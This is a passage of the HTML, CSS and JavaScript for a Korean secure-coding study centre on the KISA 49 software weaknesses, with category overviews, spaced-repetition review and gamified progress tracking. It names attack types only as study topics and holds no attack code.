.bdg{display:flex;flex-direction:column;align-items:center;text-align:center;gap:3px;padding:13px 8px;border:1px solid #e2e8f0;border-radius:12px;background:#f8fafc;opacity:.45;filter:grayscale(1)}
.bdg.got{opacity:1;filter:none;background:#fff;border-color:#c7d2fe;box-shadow:0 2px 8px rgba(79,70,229,.12)}
.bdg .bd-i{font-size:26px}.bdg .bd-n{font-size:13px;font-weight:700;color:#1e293b}.bdg .bd-d{font-size:10.5px;color:#64748b}
.heat-wrap{margin-top:22px}.heat-wrap h3{margin:0 0 12px;font-size:16px}
.heatmap{display:grid;grid-template-rows:repeat(7,1fr);grid-auto-flow:column;grid-auto-columns:13px;gap:3px;overflow-x:auto;padding-bottom:4px}
.hm{width:13px;height:13px;border-radius:3px;background:#ebedf0;display:inline-block}
.hm0{background:#ebedf0}.hm1{background:#c6e48b}.hm2{background:#7bc96f}.hm3{background:#239a3b}.hm4{background:#196127}
.heat-legend{display:flex;align-items:center;gap:4px;font-size:11px;color:#64748b;margin-top:8px}
.rec-cta{background:#eef2ff;border:1px solid #c7d2fe;border-radius:12px;padding:13px 16px;margin:8px 0 18px;font-size:14px;color:#3730a3;display:flex;flex-wrap:wrap;align-items:center;gap:10px}
.path-list{display:flex;flex-direction:column;gap:0}
.pstage{display:flex;gap:14px;align-items:stretch}
.pstage .ps-line{display:flex;flex-direction:column;align-items:center;width:34px}
.pstage .ps-icon{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:#e2e8f0;font-size:17px;flex-shrink:0}
.pstage.done .ps-icon{background:#dcfce7}.pstage.cur .ps-icon{background:#4f46e5;box-shadow:0 0 0 4px rgba(79,70,229,.2)}
.pstage .ps-conn{flex:1;width:3px;background:#e2e8f0;min-height:18px}
.pstage.done .ps-conn{background:#86efac}
.pstage .ps-body{flex:1;padding:0 0 22px}
.ps-h{font-size:15px;font-weight:700;color:#1e293b;display:flex;align-items:center;gap:8px}
.ps-now{font-size:11px;font-weight:700;color:#fff;background:#4f46e5;border-radius:20px;padding:2px 9px}
.ps-d{font-size:12.5px;color:#64748b;margin:2px 0 7px}
.ps-bar{height:9px;background:#e2e8f0;border-radius:6px;overflow:hidden;max-width:340px}
.ps-bar i{display:block;height:100%;background:linear-gradient(90deg,#4f46e5,#7c3aed);border-radius:6px;transition:width .4s}
.ps-pct{font-size:11.5px;color:#475569;margin:4px 0 6px;font-weight:600}
.ps-go{font-size:12px;padding:5px 12px}
/* 설계 진단(복합서술형) */
.ds-list{display:flex;flex-direction:column;gap:10px}
.ds-card{border:1px solid #e2e8f0;border-radius:12px;padding:14px 16px;background:#fff}
.ds-card .ds-h{font-size:15px;margin-bottom:4px}.ds-card .ds-sc{font-size:13px;color:#64748b;margin-bottom:10px;line-height:1.55}
.ds-docs{display:flex;flex-direction:column;gap:10px;margin:8px 0 4px}
.ds-doc{border:1px solid #e2e8f0;border-radius:10px;overflow:hidden}
.ds-doc-h{background:#f1f5f9;font-size:12.5px;font-weight:700;color:#334155;padding:7px 12px;border-bottom:1px solid #e2e8f0}
.ds-doc pre{margin:0;padding:11px 13px;font-size:12.5px;line-height:1.6;white-space:pre-wrap;word-break:break-word;background:#fff;color:#0f172a;font-family:'JetBrains Mono',monospace}
select.pin{width:100%;max-width:360px;padding:9px 11px;border:1px solid #cbd5e1;border-radius:8px;font-size:14px}
/* 실제 시험 구조 안내 패널 */
.examinfo{background:#f0f9ff;border:1px solid #bae6fd;border-left:4px solid #0ea5e9;border-radius:10px;padding:12px 16px;margin:4px 0 14px;font-size:13px;color:#0c4a6e}
.examinfo b{color:#075985}.examinfo ul{margin:7px 0 6px;padding-left:18px}.examinfo li{margin:3px 0;line-height:1.55}
.examinfo .ei-note{display:block;font-size:11.5px;color:#0369a1;margin-top:4px}
/* 리더보드 */
.cert-form{display:flex;flex-wrap:wrap;align-items:center;gap:10px;margin:6px 0 12px}
.cert-form label{font-size:13px;font-weight:600;color:#334155;display:flex;align-items:center;gap:8px}
.cert-form input{border:1px solid #cbd5e1;border-radius:8px;padding:8px 11px;font-size:14px;min-width:160px}
.lb-row{display:grid;grid-template-columns:54px 1fr 76px 96px 64px;align-items:center;gap:6px;padding:11px 12px;border-bottom:1px solid #eef2f7;font-size:14px}
.lb-row.lb-head{font-size:11.5px;font-weight:700;color:#64748b;background:#f8fafc;border-radius:8px 8px 0 0;border-bottom:2px solid #e2e8f0}
.lb-row.me{background:#eef2ff;border-radius:8px;font-weight:700}
.lb-rank{font-size:16px;text-align:center}.lb-name{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.lb-lv{color:#7c3aed;font-weight:700;font-size:13px}.lb-xp{font-weight:700;color:#1e293b;text-align:right;font-size:13px}.lb-st{text-align:right;font-size:13px}
@media(max-width:768px){.gam-lv .lv-bar{width:80px}.gam-row{gap:7px}.gam-chip{font-size:12px;padding:6px 11px}
  .lb-row{grid-template-columns:38px 1fr 56px 70px;font-size:12.5px}.lb-st{display:none}}
/* B2B SaaS Demo CSS */
.saas-container{display:flex;flex-direction:column;gap:30px}
.saas-section{background:#ffffff;border:1px solid #e2e8f0;border-radius:18px;padding:28px;box-shadow:0 8px 30px rgba(0,0,0,0.04);transition:all 0.3s cubic-bezier(0.4, 0, 0.2, 1);position:relative;overflow:hidden}
.saas-section::before{content:"";position:absolute;top:0;left:0;width:100%;height:4px;background:linear-gradient(90deg, #4f46e5, #06b6d4)}
.saas-section:hover{transform:translateY(-2px);box-shadow:0 12px 38px rgba(79,70,229,0.06)}
.saas-section h3{font-size:19px;margin-bottom:14px;display:flex;align-items:center;gap:10px;color:#0f172a;font-weight:700}
.saas-badge{background:linear-gradient(135deg, #4f46e5, #6366f1);color:#fff;font-size:10px;font-weight:800;border-radius:20px;padding:3px 10px;text-transform:uppercase;letter-spacing:0.5px}
.saas-grid-2{display:grid;grid-template-columns:1fr 1fr;gap:24px}
@media(max-width:820px){.saas-grid-2{grid-template-columns:1fr}}
.sandbox-box{border:1px solid #334155;border-radius:14px;overflow:hidden;background:#0b0f19;color:#e2e8f0;font-family:'JetBrains Mono',monospace;box-shadow:0 10px 25px -5px rgba(0,0,0,0.3)}
.sandbox-header{background:#1e293b;padding:12px 16px;font-size:13px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #0f172a}
.sandbox-dot{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:4px}
.sandbox-body{padding:16px;font-size:12.5px;min-height:120px;display:flex;flex-direction:column;gap:12px}
.sandbox-editor-p{background:#030712;padding:12px;border-radius:10px;border:1px solid #1e293b;color:#f3f4f6;font-size:12.5px;line-height:1.6}
.sandbox-input-row{display:flex;gap:10px;align-items:center;margin-top:8px}
.sandbox-input{flex:1;background:#1e293b;border:1px solid #475569;color:#fff;padding:10px 14px;border-radius:8px;font-family:inherit;font-size:13px;transition:all 0.2s}
.sandbox-input:focus{outline:none;border-color:#6366f1;box-shadow:0 0 0 3px rgba(99,102,241,0.2)}
.sandbox-preview{background:#f8fafc;color:#1e293b;border:1px solid #e2e8f0;border-radius:10px;padding:16px;font-family:sans-serif;font-size:13px;min-height:110px;transition:all 0.3s;box-shadow:inset 0 2px 4px rgba(0,0,0,0.02)}
.sandbox-preview.exploited{background:#fff5f5;border-color:#feb2b2;box-shadow:0 0 15px rgba(239,68,68,0.1), inset 0 2px 4px rgba(0,0,0,0.02)}
.sandbox-preview.secured{background:#f0fdf4;border-color:#bbf7d0;box-shadow:0 0 15px rgba(34,197,94,0.1), inset 0 2px 4px rgba(0,0,0,0.02)}
.sandbox-console{background:#030712;color:#38bdf8;padding:12px;border-radius:8px;font-size:12px;min-height:70px;white-space:pre-wrap;border:1px solid #1e293b;line-height:1.5;font-family:'JetBrains Mono',monospace}
.hook-ide{border:1px solid #2d3139;border-radius:12px;background:#1e222a;color:#abb2bf;font-family:'JetBrains Mono',monospace;font-size:12.5px;overflow:hidden;box-shadow:0 10px 25px -5px rgba(0,0,0,0.25)}
.hook-ide-h{background:#21252b;padding:10px 14px;font-size:11.5px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #181a1f}
.hook-ide-body{padding:16px;position:relative;background:#282c34}
.hook-warning{background:rgba(224,108,117,0.12);border-left:4px solid #e06c75;padding:12px 14px;border-radius:0 8px 8px 0;margin-top:12px;border-top:1px solid rgba(224,108,117,0.1);border-right:1px solid rgba(224,108,117,0.1);border-bottom:1px solid rgba(224,108,117,0.1)}
.hook-warning-h{color:#e06c75;font-weight:700;font-size:13px;display:flex;align-items:center;gap:6px}
.hook-warning-b{font-size:12px;color:#abb2bf;margin-top:6px;line-height:1.5}
.hook-warning-lnk{color:#61afef;text-decoration:none;cursor:pointer;font-weight:700;transition:color 0.2s}
.hook-warning-lnk:hover{color:#98c379;text-decoration:underline}
.hook-jira{border:1.5px dashed #3b82f6;border-radius:12px;background:#f0f7ff;padding:16px;color:#1e3a8a;box-shadow:0 4px 12px rgba(59,130,246,0.03)}
.hook-jira-h{font-size:13px;font-weight:700;margin-bottom:8px;display:flex;align-items:center;gap:6px;color:#1d4ed8}
.hook-jira-widget{background:#fff;border:1px solid #bfdbfe;border-radius:10px;padding:14px;margin-top:10px;box-shadow:0 2px 8px rgba(0,0,0,0.02)}
.persona-sel{padding:10px 14px;border:2px solid var(--p);border-radius:10px;font-size:14px;width:100%;max-width:320px;font-family:inherit;margin-bottom:18px;background:#fff;color:#1e293b;font-weight:600;transition:all 0.2s}
.persona-sel:focus{outline:none;box-shadow:0 0 0 3px rgba(79,70,229,0.15)}
.persona-paths{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px}
.persona-card{border:1px solid #e2e8f0;border-radius:14px;padding:16px;background:#f8fafc;transition:all 0.25s ease;position:relative}
.persona-card.active{border-color:var(--p);background:#f5f3ff;box-shadow:0 4px 15px rgba(79,70,229,0.06), 0 0 0 2px var(--p) inset}
.persona-card-h{font-weight:700;font-size:15px;margin-bottom:6px;color:#1e293b}
.persona-card-d{font-size:12px;color:var(--muted);display:flex;justify-content:space-between;align-items:center}
.persona-badge{font-size:10px;font-weight:700;padding:2px 6px;border-radius:12px}
.tour-lb{border:1px solid #e2e8f0;border-radius:14px;overflow:hidden;background:#fff;box-shadow:0 4px 15px rgba(0,0,0,0.02)}
.tour-row{display:grid;grid-template-columns:48px 1fr 90px 80px;padding:12px 16px;border-bottom:1px solid #f1f5f9;font-size:13px;align-items:center;transition:background 0.2s}
.tour-row:hover{background:#f8fafc}
.tour-row.head{background:#f8fafc;font-weight:700;border-bottom-width:2px;font-size:11.5px;color:var(--muted)}
.tour-row.rank-1{background:linear-gradient(90deg, #fffbeb, #fff);border-left:4px solid #fbbf24}
.tour-row.rank-2{background:linear-gradient(90deg, #f1f5f9, #fff);border-left:4px solid #cbd5e1}
.tour-row.rank-3{background:linear-gradient(90deg, #fff7ed, #fff);border-left:4px solid #fb923c}
.tour-rank{text-align:center;font-weight:800;font-size:14px;color:#475569}
.tour-row.rank-1 .tour-rank{color:#d97706}
.tour-row.rank-2 .tour-rank{color:#475569}
.tour-row.rank-3 .tour-rank{color:#ea580c}
.tour-name{font-weight:600;color:#334155}
.tour-xp{text-align:right;font-family:'JetBrains Mono',monospace;color:#4f46e5;font-weight:800;font-size:13.5px}
.tour-streak{text-align:right;font-weight:600;color:#e11d48}
.semgrep-panel{display:grid;grid-template-columns:1fr 1.1fr;gap:20px}
@media(max-width:820px){.semgrep-panel{grid-template-columns:1fr}}
.semgrep-log{background:#030712;color:#f3f4f6;border-radius:14px;padding:16px;font-family:'JetBrains Mono',monospace;font-size:11.5px;border:1px solid #1e293b;overflow-y:auto;max-height:280px;line-height:1.5}
.semgrep-finding{border-left:4px solid #ef4444;background:rgba(239,68,68,0.08);padding:8px 12px;margin-bottom:12px;border-radius:0 8px 8px 0;border-top:1px solid rgba(239,68,68,0.05);border-right:1px solid rgba(239,68,68,0.05);border-bottom:1px solid rgba(239,68,68,0.05)}
.semgrep-finding.fixed{border-left-color:#22c55e;background:rgba(34,197,94,0.08);border-top-color:rgba(34,197,94,0.05);border-right-color:rgba(34,197,94,0.05);border-bottom-color:rgba(34,197,94,0.05)}
.persona-prog-container{background:#e2e8f0;border-radius:10px;height:8px;overflow:hidden;margin-bottom:18px;display:flex}
.persona-prog-bar{background:linear-gradient(90deg, #4f46e5, #06b6d4);height:100%;transition:width 0.4s cubic-bezier(0.4, 0, 0.2, 1)}
.persona-prog-info{display:flex;justify-content:space-between;font-size:12px;font-weight:700;color:#475569;margin-bottom:6px}
.ai-fix-btn{background:#e0f2fe;color:#0369a1;border:1px solid #bae6fd;padding:6px 12px;border-radius:6px;font-size:11.5px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:4px;margin-top:6px;transition:all 0.2s}
.ai-fix-btn:hover{background:#0284c7;color:#fff;border-color:#0284c7}
@media print{
  body{background:#fff!important}
  body *{visibility:hidden}
  #printArea,#printArea *{visibility:visible}
  #printArea{display:block;position:absolute;left:0;top:0;width:100%;padding:0 8px}
  .ptbl tr{page-break-inside:avoid}
}
</style>
</head>
<body>
<a href="#mainviews" class="skiplink">본문 바로가기</a>
<div id="ariaLive" class="visually-hidden" role="status" aria-live="polite"></div>
<div class="top"><div class="wrap"><a href="secure-dev-portal.html">&larr; 개발보안 학습 포털</a> &nbsp;·&nbsp; <a href="index.html">홈</a></div></div>
<div class="hero"><div class="wrap"><h1>🎓 보안약점 진단원 학습 센터</h1><p>개념 학습 · 플래시카드 · 1교시 이론(객관식·OX·단답) · 2교시 실무(정·오탐 판별 + 서술형 채점) · 오답노트 — 진도 자동 저장</p></div></div>
<div class="tabs"><div class="wrap" role="tablist" aria-label="학습 메뉴">
  <button class="tab on" data-v="dash" onclick="tab('dash')">📊 대시보드</button>
  <button class="tab" data-v="path" onclick="tab('path')">🗺️ 학습 경로</button>
  <button class="tab" data-v="basics" onclick="tab('basics')">🧱 기초 과정</button>
  <button class="tab" data-v="learn" onclick="tab('learn')">📖 개념학습</button>
  <button class="tab" data-v="flash" onclick="tab('flash')">🃏 플래시카드</button>
  <button class="tab" data-v="exam" onclick="tab('exam')">📝 1교시 이론</button>
  <button class="tab" data-v="prac" onclick="tab('prac')">🧪 2교시 실무</button>
  <button class="tab" data-v="design" onclick="tab('design')">📐 설계 진단</button>
  <button class="tab" data-v="ide" onclick="tab('ide')">💻 코드 실행</button>
  <button class="tab" data-v="wrong" onclick="tab('wrong')">❌ 오답노트</button>
  <button class="tab" data-v="saas" onclick="tab('saas')">🚀 B2B 상용화 데모</button>
</div></div>
<div class="wrap" id="mainviews">
  <div class="view on" id="v-dash"></div>
  <div class="view" id="v-path"></div>
  <div class="view" id="v-basics"></div>
  <div class="view" id="v-learn"></div>
  <div class="view" id="v-flash"></div>
  <div class="view" id="v-exam"></div>
  <div class="view" id="v-prac"></div>
  <div class="view" id="v-design"></div>
  <div class="view" id="v-ide"></div>
  <div class="view" id="v-wrong"></div>
  <div class="view" id="v-saas"></div>
</div>
<div id="printArea" aria-hidden="true"></div>
<datalist id="kisa49"></datalist>

<script>
const CONCEPTS = __CONCEPTS__;
const QUIZ = __QUIZ__;
const PRACTICAL = __PRACTICAL__;
const THEORY = __THEORY__;
const CODE49 = __CODE49__;
const BASICS = __BASICS__;
const TOOLS = __TOOLS__;
const RUNNABLE = __RUNNABLE__;
const DESIGN = __DESIGN__;
const KISA49 = CONCEPTS.map(c=>c.name);
const CATS = ['입력검증','보안기능','시간상태','에러처리','코드오류','캡슐화','API오용'];
const CCOLOR = {'입력검증':'#6366f1','보안기능':'#0ea5e9','시간상태':'#14b8a6','에러처리':'#f59e0b','코드오류':'#ef4444','캡슐화':'#8b5cf6','API오용':'#64748b'};
// KISA 7대 유형 개요 — 정의/대표 약점/진단 핵심 포인트
const CATEGORY_INFO = {
  '입력검증':{full:'입력데이터 검증 및 표현',def:'외부 입력값을 부적절하게 검증·인코딩하여 의도치 않은 명령·스크립트가 실행되는 유형.',ex:'SQL 삽입 · XSS · 경로 조작 · OS 명령어 삽입 · XXE/SSRF',diag:'모든 외부 입력 경로를 식별하고, 신뢰경계에서 화이트리스트 검증과 맥락별 출력 인코딩(파라미터 바인딩 포함)이 적용되는지 확인한다.'},
  '보안기능':{full:'보안기능',def:'인증·인가·암호화·권한관리 등 보안기능을 부적절하게 구현한 유형.',ex:'부적절한 인가 · 취약한 암호화 알고리즘 · 하드코드된 중요정보 · 솔트 없는 해시',diag:'인증/인가가 서버 측에서 수행되는지, 암호 알고리즘·키·IV·난수원 관리가 적절한지, 비밀번호가 솔트+적응형 해시로 저장되는지 점검한다.'},
  '시간상태':{full:'시간 및 상태',def:'동시·병렬 처리 환경에서 시간과 상태를 잘못 다뤄 발생하는 유형.',ex:'경쟁조건(TOCTOU)',diag:'공유 자원 접근에 동기화(락)가 있는지, 검사 시점과 사용 시점 사이에 상태가 바뀔 수 없는지(원자성)를 확인한다.'},
  '에러처리':{full:'에러처리',def:'오류를 부적절하게 처리하거나 과도한 정보를 노출하는 유형.',ex:'오류 메시지 정보 노출 · 부적절한 예외 처리 · 오류 상황 대응 부재',diag:'예외를 구체적 유형별로 처리하는지, 사용자에게 노출되는 오류 정보가 최소화되는지, 빈 예외 블록이 없는지 점검한다.'},
  '코드오류':{full:'코드오류',def:'개발자의 코딩 실수로 인한 결함 유형.',ex:'Null Pointer 역참조 · 부적절한 자원 해제 · 정수형 오버플로우 · 해제된 자원 사용',diag:'사용 전 null 검사, finally/with를 통한 자원 해제, 연산 경계값·자료형 크기, 해제 후 포인터 무효화 여부를 확인한다.'},
  '캡슐화':{full:'캡슐화',def:'중요 데이터나 기능을 부적절하게 노출·보호하지 못하는 유형.',ex:'제거되지 않고 남은 디버그 코드 · 잘못된 접근 지정자',diag:'배포 전 디버그/주석/백도어성 코드가 제거됐는지, 민감 정보·내부 구현의 접근 범위가 최소화됐는지 점검한다.'},
  'API오용':{full:'API 오용',def:'의도와 다르게 또는 보안상 위험한 API를 사용하는 유형.',ex:'DNS lookup에 의존한 보안 결정 · 취약한 API 사용',diag:'폐기(deprecated)·위험 API 사용 여부, 보안 결정을 위·변조 가능한 정보(DNS 등)에 의존하는지, 안전한 대체 API로 교체됐는지 확인한다.'}
};
// 개념→대표 시뮬레이터 매핑(있으면 링크)
const SIMMAP={'SQL 삽입':'03_code_sql_injection.html','코드 삽입':'03_code_codeinjection.html','경로 조작 및 자원 삽입':'03_code_path_traversal.html','크로스사이트 스크립트(XSS)':'03_code_xss.html','운영체제 명령어 삽입':'03_code_os_command.html','위험한 형식 파일 업로드':'03_code_dangerous_file_upload.html','신뢰되지 않는 URL 주소로 자동접속 연결':'03_code_open_redirect.html','XML 외부 개체(XXE)':'03_code_xxe.html','XML 삽입':'03_code_xml.html','LDAP 삽입':'03_code_ldap_injection.html','크로스사이트 요청 위조(CSRF)':'03_code_csrf.html','서버사이드 요청 위조(SSRF)':'03_code_ssrf.html','HTTP 응답 분할':'03_code_http_split.html','정수형 오버플로우':'03_code_integer_overflow.html','메모리 버퍼 오버플로우':'03_code_bufferoverflow.html','적절한 인증 없는 중요기능 허용':'03_code_missing_auth.html','부적절한 인가':'03_code_inapporiate_auth.html','취약한 암호화 알고리즘 사용':'03_code_risky_crypto.html','하드코드된 중요정보':'03_code_hardedcode.html','적절하지 않은 난수값 사용':'03_code_useofinsufficient_random.html','취약한 비밀번호 허용':'03_code_weakpassword.html','솔트 없이 일방향 해시함수 사용':'03_code_nosalthash.html','경쟁조건: 검사시점과 사용시점(TOCTOU)':'03_code_race_condition.html','오류 메시지 정보 노출':'03_code_error_message.html','부적절한 예외 처리':'03_code_improper_exception.html','Null Pointer 역참조':'03_code_null_pointer.html','부적절한 자원 해제':'03_code_improper_resource_release.html','해제된 자원 사용':'03_code_use_after_free.html','초기화되지 않은 변수 사용':'03_code_uninitialized_variable.html','신뢰할 수 없는 데이터의 역직렬화':'03_code_deserialization.html','제거되지 않고 남은 디버그 코드':'03_code_debug_code.html','DNS lookup에 의존한 보안 결정':'03_code_dns_security_decision.html','취약한 API 사용':'03_code_vulnerable_api.html'};

const NS='sda_';
function load(k,d){try{return JSON.parse(localStorage.getItem(NS+k))??d;}catch(e){return d;}}
function save(k,v){localStorage.setItem(NS+k,JSON.stringify(v));}
let learned=load('learned',{}),flashKnown=load('flash',{}),wrongs=load('wrong',[]);
let examBest=load('examBest',null),pracBest=load('pracBest',null);
let wrongStats=load('wrongStats',{});  // 7대 유형별 누적 오답 통계 {cat:count}
// ── 오답노트 SRS(SM-2 경량: ease factor 기반 간격 반복) ──
const DAY=86400000;
// 구버전/누락 항목 정규화: box·due·ef·rep·interval 보강(기존 오답은 즉시 복습 대상)
(function(){let m=false;wrongs.forEach(w=>{
  if(typeof w.box!=='number'){w.box=1;m=true;}
  if(typeof w.due!=='number'){w.due=Date.now();m=true;}
  if(typeof w.ef!=='number'){w.ef=2.5;m=true;}        // 용이도 인수(1.3~)
  if(typeof w.rep!=='number'){w.rep=0;m=true;}         // 연속 정답 횟수
  if(typeof w.interval!=='number'){w.interval=0;m=true;}
});if(m)save('wrong',wrongs);})();
function srsDue(w){return (w.due||0)<=Date.now();}
function dueCount(){return wrongs.filter(srsDue).length;}
// quality 0~5(다시=2, 애매=3, 완벽=5). SM-2: interval=1,6,prev*ef … 충분 숙달 시 졸업.
function srsUpdate(w,quality){
  if(typeof w.ef!=='number')w.ef=2.5; if(typeof w.rep!=='number')w.rep=0;
  if(quality>=3){
    w.rep++;
    if(w.rep===1)w.interval=1; else if(w.rep===2)w.interval=6; else w.interval=Math.round((w.interval||6)*w.ef);
    w.ef=Math.max(1.3, w.ef + (0.1-(5-quality)*(0.08+(5-quality)*0.02)));
    w.box=Math.min((w.box||1)+1,5);
    if(w.rep>=4 && quality>=4){wrongs=wrongs.filter(x=>x!==w);save('wrong',wrongs);if(typeof gam!=='undefined'){gam.graduates=(gam.graduates||0)+1;awardXp(8,'복습 졸업');}return {graduated:true,interval:w.interval};}  // 졸업(반복 숙달)
  }else{
    w.rep=0; w.interval=0; w.box=1; w.ef=Math.max(1.3, w.ef-0.2);  // 실패 → 즉시 재출제
  }
  w.due=Date.now()+w.interval*DAY;
  save('wrong',wrongs);return {graduated:false,interval:w.interval};
}
// 다음 복습까지 남은 일수(표시용)
function daysUntil(w){const d=Math.ceil(((w.due||0)-Date.now())/DAY);return d<=0?'지금':('약 '+d+'일 후');}
// 새 오답 추가(이미 있으면 1단계로 리셋해 다시 복습 대상화) + 7대 유형 누적 통계
function addWrong(it){
  if(it.cat&&CATS.indexOf(it.cat)>=0){wrongStats[it.cat]=(wrongStats[it.cat]||0)+1;save('wrongStats',wrongStats);}
  const ex=wrongs.find(w=>w.q===it.q);if(ex){ex.box=1;ex.due=Date.now();ex.rep=0;ex.interval=0;save('wrong',wrongs);return;}
  it.box=1;it.due=Date.now();it.addedAt=Date.now();it.ef=2.5;it.rep=0;it.interval=0;wrongs.push(it);save('wrong',wrongs);
}
// 취약 유형 Top 3 (메타인지 학습 안내)
function topWeakHtml(){
  const ent=Object.keys(wrongStats).map(k=>[k,wrongStats[k]]).filter(e=>e[1]>0&&CATS.indexOf(e[0])>=0).sort((a,b)=>b[1]-a[1]).slice(0,3);
  if(!ent.length)return '';
  const items=ent.map((e,i)=>'<div class="tw-item"><span class="tw-rank">'+(i+1)+'</span><span class="tw-cat" style="background:'+CCOLOR[e[0]]+'">'+esc(e[0])+'</span><div class="tw-bar"><i style="width:'+Math.round(e[1]/ent[0][1]*100)+'%;background:'+CCOLOR[e[0]]+'"></i></div><span class="tw-cnt">오답 '+e[1]+'회</span></div>').join('');
  return '<div class="topweak"><h3>⚠ 취약 유형 Top 3 — 집중 복습 권장</h3>'+items+'<p class="tw-tip">해당 유형의 개념카드(유형 개요 배너)와 오답 복습(SRS)을 우선 진행하세요.</p></div>';
}

// ===== 게이미피케이션: XP·레벨·연속학습(스트릭)·배지·일일목표 =====
// 실제 교육 플랫폼(TryHackMe·Secure Code Warrior·Duolingo)의 동기부여 설계를 무료 클라이언트(localStorage)로 이식.
let gam = load('gam',{xp:0,streak:0,bestStreak:0,lastActive:'',days:{},badges:{},claimed:{},graduates:0,visited:{}});
const DAILY_GOAL = 50;            // 하루 권장 XP
function _pad2(n){return String(n).padStart(2,'0');}
function todayKey(d){d=d||new Date();return d.getFullYear()+'-'+_pad2(d.getMonth()+1)+'-'+_pad2(d.getDate());}
function _ymd(d){return new Date(d.getFullYear(),d.getMonth(),d.getDate());}
// 레벨 곡선: 레벨업마다 필요 XP가 1.35배씩 증가(완만한 성장)
function levelInfo(xp){let l=1,need=100,rem=xp||0;while(rem>=need){rem-=need;l++;need=Math.round(need*1.35);}return {level:l,inLevel:rem,need:need,pct:Math.round(rem/need*100)};}
function touchDay(){
  const t=todayKey();
  if(gam.lastActive!==t){
    const y=_ymd(new Date());y.setDate(y.getDate()-1);
    gam.streak=(gam.lastActive===todayKey(y))?((gam.streak||0)+1):1;
    gam.lastActive=t;
    if(gam.streak>(gam.bestStreak||0))gam.bestStreak=gam.streak;
  }
  if(gam.days[t]==null)gam.days[t]=0;
}
function awardXp(n,reason,claimKey){
  if(claimKey){if(gam.claimed[claimKey])return 0;gam.claimed[claimKey]=1;}
  if(n>0){touchDay();gam.xp=(gam.xp||0)+n;const t=todayKey();gam.days[t]=(gam.days[t]||0)+n;}
  const newly=checkBadges();
  save('gam',gam);
  if(n>0&&reason)gamToast('+'+n+' XP · '+reason);
  newly.forEach(b=>gamToast('🏅 배지 획득: '+b.icon+' '+b.name));
  const dh=document.getElementById('gamHeader');if(dh)dh.innerHTML=gamHeaderHtml();
  return n;
}
const BADGES=[
  {id:'first_concept',icon:'🌱',name:'첫 걸음',desc:'개념 1개 학습',test:()=>Object.keys(learned).length>=1},
  {id:'concept_half',icon:'📚',name:'절반 정복',desc:'개념 25개 학습',test:()=>Object.keys(learned).length>=25},
  {id:'concept_all',icon:'🏆',name:'49개 완주',desc:'전 개념 학습',test:()=>Object.keys(learned).length>=49},
  {id:'flash_all',icon:'🃏',name:'플래시 마스터',desc:'플래시 49 숙련',test:()=>Object.keys(flashKnown).length>=49},
  {id:'exam_pass',icon:'✅',name:'1교시 합격',desc:'1교시 70%+',test:()=>examBest!=null&&examBest>=70},
  {id:'exam_perfect',icon:'💯',name:'1교시 만점',desc:'1교시 100%',test:()=>examBest===100},
  {id:'prac_pass',icon:'🧪',name:'2교시 합격',desc:'2교시 평균 70%+',test:()=>pracBest!=null&&pracBest>=70},
  {id:'streak3',icon:'🔥',name:'3일 연속',desc:'3일 연속 학습',test:()=>(gam.streak||0)>=3},
  {id:'streak7',icon:'🔥',name:'일주일 연속',desc:'7일 연속 학습',test:()=>(gam.streak||0)>=7},
  {id:'review10',icon:'🔁',name:'복습의 달인',desc:'SRS 졸업 10회',test:()=>(gam.graduates||0)>=10},
  {id:'xp500',icon:'⚡',name:'500 XP',desc:'누적 500 XP',test:()=>(gam.xp||0)>=500},
  {id:'xp1000',icon:'⭐',name:'1000 XP',desc:'누적 1000 XP',test:()=>(gam.xp||0)>=1000},
  {id:'level5',icon:'🎖️',name:'레벨 5',desc:'레벨 5 도달',test:()=>levelInfo(gam.xp).level>=5}
];
function checkBadges(){const out=[];BADGES.forEach(b=>{if(!gam.badges[b.id]&&b.test()){gam.badges[b.id]=Date.now();out.push(b);}});return out;}
function gamToast(msg){
  if(typeof document==='undefined'||!document.body)return;
  let host=document.getElementById('gamToasts');
  if(!host||!host.parentNode){host=document.createElement('div');host.id='gamToasts';document.body.appendChild(host);}
  const el=document.createElement('div');el.className='gtoast';el.textContent=msg;host.appendChild(el);
  setTimeout(()=>{el.classList.add('show');},20);
  setTimeout(()=>{el.classList.remove('show');setTimeout(()=>{if(el.parentNode)el.parentNode.removeChild(el);},300);},2600);
}
function gamHeaderHtml(){
  const li=levelInfo(gam.xp||0);const today=gam.days[todayKey()]||0,gpct=Math.min(100,Math.round(today/DAILY_GOAL*100));
  return '<div class="gam-row">'+
    '<div class="gam-lv"><span class="lv-num">Lv.'+li.level+'</span><div class="lv-bar"><i style="width:'+li.pct+'%"></i></div><span class="lv-xp">'+(gam.xp||0)+' XP</span></div>'+
    '<div class="gam-chip streak'+((gam.streak||0)>0?' active':'')+'">🔥 '+(gam.streak||0)+'일 연속</div>'+
    '<div class="gam-chip">🎯 오늘 '+today+'/'+DAILY_GOAL+' XP'+(gpct>=100?' ✅':'')+'</div>'+
    '<div class="gam-chip">🏅 배지 '+Object.keys(gam.badges).length+'/'+BADGES.length+'</div></div>';
}
function badgesHtml(){
  const items=BADGES.map(b=>{const got=!!gam.badges[b.id];return '<div class="bdg'+(got?' got':'')+'"><span class="bd-i">'+b.icon+'</span><span class="bd-n">'+esc(b.name)+'</span><span class="bd-d">'+esc(b.desc)+'</span></div>';}).join('');
  return '<div class="badges-wrap"><h3>🏅 배지 ('+Object.keys(gam.badges).length+'/'+BADGES.length+')</h3><div class="bgrid-bdg">'+items+'</div></div>';
}
function heatmapHtml(){
  const WEEKS=12,cells=[];
  for(let i=WEEKS*7-1;i>=0;i--){const d=_ymd(new Date());d.setDate(d.getDate()-i);const k=todayKey(d),v=gam.days[k]||0;
    const lvl=v<=0?0:v<20?1:v<50?2:v<100?3:4;cells.push('<span class="hm hm'+lvl+'" title="'+k+': '+v+' XP"></span>');}
  return '<div class="heat-wrap"><h3>📅 최근 12주 학습 활동</h3><div class="heatmap">'+cells.join('')+'</div>'+
    '<div class="heat-legend">적음 <span class="hm hm0"></span><span class="hm hm1"></span><span class="hm hm2"></span><span class="hm hm3"></span><span class="hm hm4"></span> 많음</div></div>';
}

// ===== 학습 경로(가이드형 커리큘럼) =====
const PATH_STAGES=[
